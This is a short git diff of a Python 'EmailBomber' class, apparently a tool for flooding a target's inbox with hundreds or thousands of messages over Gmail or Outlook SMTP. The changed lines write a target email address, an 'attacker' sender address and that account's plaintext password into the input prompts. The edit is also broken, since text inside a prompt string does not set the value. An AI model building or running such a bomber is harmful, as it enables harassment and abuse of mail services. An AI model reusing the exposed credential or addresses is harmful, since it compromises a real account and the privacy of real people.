@@ -50,8 +50,8 @@ class EmailBomber:
         self.y = bColors.YELLOW
         try:
             print(self.b + '\n[+] Initializing bomber ...')
-            self.target = str(input(self.g + '[:] Enter Target Email > '))
-            self.mode = int(input(self.g + '[:] Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) > '))
+            self.target = str(input(self.g + '[:] Enter Target Email > chinuonly4you2002@gmail.com'))
+            self.mode = int(input(self.g + '[:] Enter BOMB mode (1,2,3,4) || 1:(1000) 2:(500) 3:(250) 4:(custom) > 4'))
 
             if int(self.mode) > int(4) or int(self.mode) < int(1):
                 print(self.r + '[-] ERROR: Invalid Option!')
@@ -100,8 +100,8 @@ class EmailBomber:
             elif self.server == '3':
                 self.server = 'smtp-mail.outlook.com'
 
-            self.fromAddr = str(input(self.g + '[:] Enter attacker email address > '))
-            self.fromPwd = str(input(self.g + '[:] Enter attacker password > '))
+            self.fromAddr = str(input(self.g + '[:] Enter attacker email address > toasted886@gmail.com '))
+            self.fromPwd = str(input(self.g + '[:] Enter attacker password > JahmelBell0!'))
             self.subject = str(input(self.g + '[:] Enter subject > '))
             self.message = str(input(self.g + '[:] Enter message > '))
 
